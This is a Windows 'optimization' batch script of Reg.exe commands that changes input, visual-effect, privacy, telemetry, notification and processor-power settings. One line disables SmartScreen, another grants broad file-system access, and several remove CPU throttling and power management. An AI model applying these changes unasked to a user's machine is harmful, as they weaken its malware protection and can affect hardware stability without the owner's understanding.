Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MouseWheelRouting" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Cursors" /v "ContactVisualization" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Cursors" /v "GestureVisualization" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "2" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "31" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\Themes" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "InstalledWin32AppsRevision" /t REG_SZ /d "{E00F4E01-A5F6-488E-A733-D341606BBD99}" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "InstalledPackagedAppsRevision" /t REG_SZ /d "{EE5761AF-9340-40EE-AFFB-D3F7ECEC59BD}" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaMUID" /t REG_SZ /d "MUID=62b4e7c3c0a24010b4c5abdfe4f2b796" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaStateLastRun" /t REG_BINARY /d "3247f55f00000000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "IsAssignedAccess" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "NamespaceSettingsRevision" /t REG_SZ /d "{EBDF1464-A4D5-443C-ACE8-21C7FCDF002F}" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "AnyAboveLockAppsActive" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338394Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338396Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "MaxTelemetryAllowed" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Settings\FindMyDevice" /v "LocationSyncEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "DiagTrackAuthorization" /t REG_DWORD /d "775" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "DiagTrackStatus" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "UploadPermissionReceived" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager" /v "MiniTraceSlotContentPermitted" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager" /v "MiniTraceSlotEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "PrivacyConsentPresentationVersion" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "PrivacyConsentSettingsVersion" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "Migrated" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCall" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Allow" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AccessibilityTemp" /v "narrator" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Narrator\NoRoam" /v "RunningState" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "SettingsVersion" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableAutocorrection" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableSpellchecking" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableTextPrediction" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnablePredictionSpaceInsertion" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableDoubleTapSpace" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\TabletTip\1.7" /v "EnableInkingWithTouch" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Input\Settings" /v "InsightsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Input\Settings" /v "Insights" /t REG_BINARY /d "01000000071de8c131cc8360a3d6d9c1330a686b165aba2e235f5a5c" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PenWorkspace" /v "PenWorkspaceAppSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" /v "DisableAutoplay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "ShowStartupPanel" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "GamePanelStartupTipIndex" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AudioCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "CursorCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "HistoricalCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppBroadcast\GlobalSettings" /v "AudioCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppBroadcast\GlobalSettings" /v "MicrophoneCaptureEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppBroadcast\GlobalSettings" /v "CursorCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppBroadcast\GlobalSettings" /v "CameraCaptureEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "OneDrive" /t REG_BINARY /d "0100000004077640378fd401" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v "NoLockScreenCamera" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v "NoLockScreen" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People" /v "PeopleBand" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CDP" /v "RomeSdkChannelUserAuthzPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CDP" /v "CdpSessionUserAuthzPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "LockScreenToastEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "QuietHoursTelemetryLastRun" /t REG_BINARY /d "2d41e95f00000000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "TabletMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "SignInMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "ConvertibleSlateModePromptPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell\StateStore" /v "ResetCacheCount" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WindowArrangementActive" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "BackOffInterval" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "CheckBackMDNotRetrieved" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "CheckBackMDRetrieved" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "DeviceMetadataServiceURL" /t REG_SZ /d "http://go.microsoft.com/fwlink/?LinkID=252669&clcid=0x409" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "MaxRetryLimit" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "RequestBatchSize" /t REG_DWORD /d "25" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings" /v "ShowSleepOption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings" /v "ShowHibernateOption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes" /v "ActivePowerScheme" /t REG_SZ /d "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c\2a737441-1930-4402-8d77-b2bebba308a3\48e6b7a6-50f5-4782-a5d4-53bb8f07e226" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_SZ /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "BranchReadinessLevel" /t REG_DWORD /d "16" /f   
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "AllowPepPerfStates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" /v "fDisablePowerManagement" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\Default\VetoPolicy" /v "EA:EnergySaverEngaged" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\28\VetoPolicy" /v "EA:PowerStateDischarging" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Misc" /v "DeviceIdlePolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
